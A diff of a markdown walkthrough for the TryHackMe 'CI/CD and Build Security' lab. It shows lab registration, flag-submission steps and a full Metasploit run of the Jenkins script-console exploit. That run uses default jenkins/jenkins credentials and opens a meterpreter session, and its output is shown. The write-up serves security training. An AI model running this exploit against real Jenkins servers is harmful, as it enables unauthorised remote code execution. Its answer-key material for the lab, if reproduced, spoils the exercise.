@@ -1,5 +1,28 @@
 # [CI/CD and Build Security](https://tryhackme.com/room/cicdandbuildsecurity)
 
+* Register to **mother** from the AttackBox:
+```shell
+ssh mother@x.x.6.250
+(password is `motherknowsbest`)
+
+Please make a selection:
+[1] Register
+[2] Authenticate
+[3] Exit
+Selection:1
+Please provide your THM username: myuser
+
+=======================================
+Thank you for checking-in with Mother for the CI/CD Network. Be careful, the are hostiles and androids about!
+Please take note of the following details and please make sure to save them, as they will not be displayed again.
+=======================================
+Username: myuser
+Password: xxxxxxxxxxxxxxxx
+MailAddr: myuser@tryhackme.loc
+IP Range: x.x.6.0/24
+=======================================
+```
+
 ## Task 6: Securing the Build Process
 
 **Prepare attacker machine**
@@ -52,32 +75,11 @@ Once you have the reverse shell you can continue to next section.
 
 **Authenticate to Mother and follow the process to claim Flag 1. What is Flag 1?**
 
-* Connect to **mother** in the AttackBox:
+* Submit proof of compromise to **mother** from the AttackBox:
 ```shell
 ssh mother@x.x.6.250
 (password is `motherknowsbest`)
-```
-* Register
-```text
-Please make a selection:
-[1] Register
-[2] Authenticate
-[3] Exit
-Selection:1
-Please provide your THM username: myuser
 
-=======================================
-Thank you for checking-in with Mother for the CI/CD Network. Be careful, the are hostiles and androids about!
-Please take note of the following details and please make sure to save them, as they will not be displayed again.
-=======================================
-Username: myuser
-Password: xxxxxxxxxxxxxxxx
-MailAddr: myuser@tryhackme.loc
-IP Range: x.x.6.0/24
-=======================================
-```
-* Submit proof of compromise:
-```text
 Please make a selection:
 [1] Register
 [2] Authenticate
@@ -121,9 +123,83 @@ echo xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx > /flag/myuser.txt
 ```
 * Back to **mother** proceed with the verification:
 ```text
-eady to verify? [Y/X/Z]: Y
+Ready to verify? [Y/X/Z]: Y
 
 Congratulations! You have received the flag for: Build Process Compromise
+
+Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
+```
+
+## Task 7: Securing the Build Server
+
+* Run the exploit using **Metasploit**:
+```shell
+msfconsole
+
+use exploit/multi/http/jenkins_script_console
+set target 1
+set payload linux/x64/meterpreter/bind_tcp
+set password jenkins
+set username jenkins
+set RHOST jenkins.tryhackme.loc
+set targeturi /
+set rport 8080
+run
+
+[*] Checking access to the script console
+[*] Logging in...
+[*] Using CSRF token: 'xxxx' (Jenkins-Crumb style v2)
+[*] x.x.x.x:8080 - Sending Linux stager...
+[*] Command Stager progress - 100.00% done (751/751 bytes)
+[*] Started bind TCP handler against x.x.x.x:4444
+[*] Sending stage (3045380 bytes) to x.x.x.x
+[*] Meterpreter session 1 opened (x.x.x.x:41949 -> x.x.x.x:4444) at 2025-05-03 19:44:11 +0100
+
+meterpreter > getuid
+Server username: jenkins
+```
+
+* Submit proof of compromise to **mother** from the AttackBox:
+```shell
+ssh mother@x.x.6.250
+(password is `motherknowsbest`)
+
+Please select an option
+[1] Submit proof of compromise
+[2] Verify past compromises
+[3] Exit
+Selection:1
+Please select which flag you would like to submit proof for:
+[1]	Build Process Compromise
+[2]	Build Server Compromise
+[3]	Build Pipeline Compromise
+[4]	DEV Environment Compromise
+[5]	PROD Environment Compromise
+[100]	Exit
+Selection:2
+Please provide the hostname of the host you have compromised (please use the name provided in your network diagram): Jenkins
+
+In order to verify your access, please complete the following steps.
+1. On the jenkins host, navigate to the /flag/ directory
+2. Create a text file with this name: myuser.txt
+3. Add the following UUID to the first line of the file: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
+4. Click proceed for the verification to occur
+
+Once you have performed the steps, please enter Y to verify your access.
+If you wish to fully exit verification and try again please, please enter X.
+If you wish to remove this verification attempt, please enter Z
+Ready to verify? [Y/X/Z]:
+```
+* Do the required steps back to **msfconsole**:
+```shell
+meterpreter > edit /flag/myuser.txt
+(paste xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)
+```
+* Back to **mother** proceed with the verification:
+```text
+Ready to verify? [Y/X/Z]: Y
+
+Congratulations! You have received the flag for: Build Server Compromise
 
 Your flag value is: THM{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}
 ```
